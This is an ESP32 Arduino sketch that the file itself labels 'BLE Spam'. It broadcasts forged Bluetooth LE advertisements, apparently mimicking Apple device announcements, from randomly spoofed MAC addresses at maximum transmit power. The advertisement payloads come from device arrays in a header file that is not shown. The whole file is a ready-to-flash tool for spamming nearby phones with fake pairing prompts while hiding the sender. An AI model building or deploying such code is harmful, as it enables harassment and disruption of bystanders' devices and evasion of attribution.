#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <cstdint>
#include <esp_arduino_version.h>
#include "devices.hpp"
#include "esp_bt.h"

#define MAX_TX_POWER  ESP_PWR_LVL_P9
#define LED_PIN       2 

BLEAdvertising *pAdvertising;
uint32_t oneSecond = 1000;
uint8_t deviceData[][31] =   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

void setup() {
  Serial.begin(115200);
  Serial.println("Setting Up BLE Spam");

  pinMode(LED_PIN, OUTPUT);

  BLEDevice::init("NAMEIF");
  Serial.println("Init BLE");

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void loop() {
  digitalWrite(LED_PIN, HIGH);
  // Generate Mac Spoofed MAC Address
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);
    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  int device_choice = random(2);
  if (device_choice == 0){
    int index = random(17);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
      #else
          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
      #endif
    #endif
  } 
  else {
    int index = random(13);
    #ifdef ESP_ARDUINO_VERSION_MAJOR
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
          oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
      #else
          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
      #endif
    #endif
  }


  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);

  Serial.println("Sending Advertisement...");
  pAdvertising->start();
  delay(10000000);
}
